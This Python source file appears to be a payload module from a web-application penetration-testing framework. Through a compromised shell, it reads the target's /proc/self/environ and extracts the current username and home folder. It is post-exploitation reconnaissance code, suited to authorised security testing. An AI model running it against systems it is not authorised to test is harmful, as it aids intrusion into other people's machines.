import re
from plugins.attack.payloads.base_payload import base_payload

class current_user(base_payload):
    '''
    This payload shows current username & folder on the system.
    '''
    def api_read(self):
        result = {}
        result['current'] = {}

        def default_user( self_environ ):
            user = re.search('(?<=USER=)(.*?)\\x00', self_environ)
            if user:
                return user.group(1)
            else:
                return ''
        
        def default_home( self_environ ):
            user = re.search('(?<=HOME=)(.*?)\\x00', self_environ)
            if user:
                return user.group(1)+'/'
            else:
                return ''
        
        #TODO: What if this file is not readable?
        self_environ = self.shell.read('/proc/self/environ')

        result['current'] = ({'user':default_user(self_environ), 'home':default_home(self_environ)})
        
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        
        for k, v in hashmap['current'].iteritems():
            result.append(k+': '+v)
        
        if result == [ ]:
            result.append('Current user not found.')
        return result
